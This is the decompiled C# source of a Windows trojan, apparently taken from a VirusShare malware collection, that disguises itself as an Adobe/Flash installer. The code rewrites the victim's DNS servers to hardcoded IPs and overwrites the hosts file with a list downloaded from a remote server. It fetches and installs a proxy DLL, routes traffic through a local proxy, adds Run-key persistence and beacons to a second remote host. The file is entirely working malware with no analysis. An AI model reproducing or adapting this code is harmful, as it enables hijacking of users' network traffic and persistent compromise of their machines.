// Decompiled with JetBrains decompiler
// Type: AdobeInstall.Module1
// Assembly: AdobeInstall, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50FC904C-E132-42D4-BCA1-7E859D246988
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.z-2afb735d623a3ef3e665b3daac3f64e88949a6dfd37909338a615c06b9f5962c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

namespace AdobeInstall
{
  [StandardModule]
  internal sealed class Module1
  {
    public static string mydns1 = "77.221.136.245";
    public static string mydns2 = "46.173.208.101";

    public static void makeDNS()
    {
      object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + "." + "\\root\\cimv2")), (Type) null, "ExecQuery", new object[1]
      {
        (object) "Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True"
      }, (string[]) null, (Type[]) null, (bool[]) null));
      try
      {
        foreach (object obj1 in (IEnumerable) objectValue1)
        {
          object objectValue2 = RuntimeHelpers.GetObjectValue(obj1);
          object Instance1;
          try
          {
            Instance1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type) null, "DNSServerSearchOrder", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Instance1 = (object) new object[2]
            {
              (object) Module1.mydns1,
              (object) Module1.mydns2
            };
            ProjectData.ClearProjectError();
          }
          try
          {
            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
            {
              (object) 0
            }, (string[]) null));
            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
            {
              (object) 1
            }, (string[]) null));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            object[] objArray = new object[2]
            {
              (object) Module1.mydns1,
              (object) Module1.mydns2
            };
            ProjectData.ClearProjectError();
          }
          object obj2 = (object) new object[2]
          {
            (object) Module1.mydns1,
            (object) Module1.mydns2
          };
          object Instance2 = objectValue2;
          object[] objArray1 = new object[1]
          {
            RuntimeHelpers.GetObjectValue(obj2)
          };
          object[] Arguments = objArray1;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(Instance2, (Type) null, "SetDNSServerSearchOrder", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
          if (flagArray[0])
            RuntimeHelpers.GetObjectValue(objArray1[0]);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public static void SaveToDisk(string resourceName, string fileName)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
      int index = 0;
      while (index < manifestResourceNames.Length)
      {
        string name = manifestResourceNames[index];
        if (Operators.CompareString(name.ToLower(), resourceName.ToLower(), false) == 0)
        {
          using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name))
          {
            if (manifestResourceStream == null)
              break;
            using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
            {
              byte[] buffer = binaryReader.ReadBytes(checked ((int) manifestResourceStream.Length));
              using (FileStream output = new FileStream(fileName, FileMode.Create))
              {
                using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
                {
                  binaryWriter.Write(buffer);
                  break;
                }
              }
            }
          }
        }
        else
          checked { ++index; }
      }
    }

    public static void SaveFiles()
    {
      try
      {
        string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
        int index = 0;
        while (index < manifestResourceNames.Length)
        {
          string resourceName = manifestResourceNames[index];
          string str = resourceName.Replace("AdobeInstall.", "");
          string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia";
          if (!Directory.Exists(path))
            Directory.CreateDirectory(path);
          Module1.SaveToDisk(resourceName, path + "\\" + str);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Module1.debug("SaveFiles: " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static void debug(string s)
    {
      if (!Module1.IsDebugMode())
        return;
      int num = (int) Interaction.MsgBox((object) s);
    }

    public static void MakeHosts()
    {
      try
      {
        System.IO.File.WriteAllText(Environment.SystemDirectory + "\\drivers\\etc\\hosts", HttpHelper.DownloadText("http://domenagent.ru/service/domains.txt").Replace("$ip", Module1.mydns1));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Module1.debug("MakeHosts: " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static void UpdateDLL()
    {
      if (HttpHelper.DownloadFile("http://domenagent.ru/service/ProxyService.dll", Module1.proxyServerDLL_temp()))
      {
        try
        {
          System.IO.File.Copy(Module1.proxyServerDLL_temp(), Module1.proxyServerDLL(), true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Module1.debug("UpdateDLL: " + ex.Message);
          ProjectData.ClearProjectError();
        }
      }
      else
        Module1.debug("UpdateDLL: fail");
    }

    public static string selfFile() => Assembly.GetExecutingAssembly().Location;

    public static string TargetDir() => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";

    public static string targetSmsFile() => Module1.TargetDir() + "install_flashplayer.exe";

    public static string targetFile() => Module1.TargetDir() + "flashutill.exe";

    public static string proxyServerFile() => Module1.TargetDir() + "TestApp.exe";

    public static string proxyServerDLL() => Module1.TargetDir() + "ProxyService.dll";

    public static string proxyServerDLL_sample() => Module1.TargetDir() + "sample.txt";

    public static string proxyServerDLL_temp() => Module1.TargetDir() + "ProxyService.dll.temp";

    public static bool CheckIfIamInstalled()
    {
      try
      {
        return System.IO.File.Exists(Module1.proxyServerDLL());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static void MakeRegistry()
    {
      try
      {
        System.IO.File.Copy(Module1.selfFile(), Module1.targetFile(), true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue("me", (object) Module1.targetFile());
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue("me1", (object) Module1.proxyServerFile());
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.WriteAllText(Module1.TargetDir() + "version", "1");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void WaitForInternet()
    {
      Module1.debug("wait internet start");
      string contents;
      while (true)
      {
        contents = HttpHelper.DownloadText("http://domenagent.ru/service/sample.txt");
        if (!contents.ToLower().Contains("replacement"))
          Thread.Sleep(5000);
        else
          break;
      }
      if (true)
        System.IO.File.WriteAllText(Module1.proxyServerDLL_sample(), contents);
      Module1.debug("wait internet stop");
    }

    public static bool IsDebugMode() => false;

    public static void InstallYandex()
    {
    }

    public static void DoNothing()
    {
      Environment.ProcessorCount.ToString();
      string str = "";
      int num = 0;
      do
      {
        str = str;
        checked { ++num; }
      }
      while (num <= 10000);
    }

    [STAThread]
    public static void Main()
    {
      Module1.DoNothing();
      bool flag = Module1.CheckIfIamInstalled();
      Module1.makeDNS();
      Module1.debug("1");
      Module1.SaveFiles();
      Module1.debug("2");
      Module1.MakeRegistry();
      Module1.debug("3");
      SettingsHelper.SetProxy("127.0.0.1", 8083);
      Module1.debug("4");
      Module1.RunServer();
      Module1.debug("5");
      Module1.WaitForInternet();
      Module1.MakeHosts();
      Module1.debug("7");
      Module1.DropServer();
      Module1.debug("8");
      Module1.UpdateDLL();
      Module1.debug("9");
      Module1.RunServer();
      Module1.GoContact();
      Module1.debug("5");
      if (!flag)
        Module1.InstallYandex();
      Module1.debug("6");
      Module1.Die();
    }

    public static void GoContact()
    {
      WebClient webClient = new WebClient();
      string Left = "";
      try
      {
        Left = Conversions.ToString(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue("Macromedia"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Operators.CompareString(Left, "", false) != 0)
        return;
      try
      {
        webClient.DownloadString("http://contact-go.ru/prod.ashx?field=prod3");
        webClient.Proxy = (IWebProxy) null;
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Macromedia", (object) "1");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Die()
    {
      Process[] processesByName = Process.GetProcessesByName(Path.GetFileName(Assembly.GetExecutingAssembly().Location));
      try
      {
        processesByName[0].Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName[1].Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void DropServer()
    {
      Process[] processesByName = Process.GetProcessesByName("TestApp");
      try
      {
        processesByName[0].Kill();
        processesByName[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName[1].Kill();
        processesByName[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void DropX()
    {
      Process[] processesByName1 = Process.GetProcessesByName("YandexInstakler");
      try
      {
        processesByName1[0].Kill();
        processesByName1[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName1[1].Kill();
        processesByName1[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process[] processesByName2 = Process.GetProcessesByName("vktemy_1027a35407bcb8069c0a836716be1f");
      try
      {
        processesByName2[0].Kill();
        processesByName2[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName2[1].Kill();
        processesByName2[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void RunServer()
    {
      Module1.DropServer();
      try
      {
        Process.Start(Module1.proxyServerFile());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
